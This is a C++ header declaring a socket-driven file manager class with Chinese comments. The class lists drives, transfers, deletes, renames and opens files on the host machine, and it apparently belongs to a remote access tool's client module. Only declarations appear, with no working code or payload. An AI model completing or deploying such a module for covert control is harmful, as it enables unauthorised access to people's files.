// FileManager.h: interface for the CFileManager class.

#include <winsock2.h>
#include <list>
#include <string>
#include <ShellAPI.h>
#include "Manager.h"
using namespace std;

#pragma once

typedef struct 
{
	UINT	nFileSize;	// 文件大小
	UINT	nSendSize;	// 已发送大小
}SENDFILEPROGRESS, *PSENDFILEPROGRESS;


class CFileManager : public CManager
{
public:
	void OnReceive(LPBYTE lpBuffer, UINT nSize);
	UINT SendDriveList();
	CFileManager(CClientSocket *pClient);
	virtual ~CFileManager();
private:
	list <CString> m_UploadList;
	UINT m_nTransferMode;
	//char m_strCurrentProcessFileName[MAX_PATH]; // 当前正在处理的文件
	CString m_strCurrentProcessFileName;
	__int64 m_nCurrentProcessFileLength; // 当前正在处理的文件的长度
	bool MakeSureDirectoryPathExists(LPCTSTR pszDirPath);
	bool UploadToRemote(LPBYTE lpBuffer);
	bool FixedUploadList(LPCTSTR lpszDirectory);
	void StopTransfer();
	UINT SendFilesList(LPCTSTR lpszDirectory);
	bool DeleteDirectory(LPCTSTR lpszDirectory);
	UINT SendFileSize(LPCTSTR lpszFileName);
	UINT SendFileData(LPBYTE lpBuffer);
	void CreateFolder(LPBYTE lpBuffer);
	void Rename(LPBYTE lpBuffer);
	int	SendToken(BYTE bToken);

	void CreateLocalRecvFile(LPBYTE lpBuffer);
	void SetTransferMode(LPBYTE lpBuffer);
	void GetFileData();
	void WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize);
	void UploadNext();
	bool OpenFile(LPCTSTR lpFile, INT nShowCmd);
};

 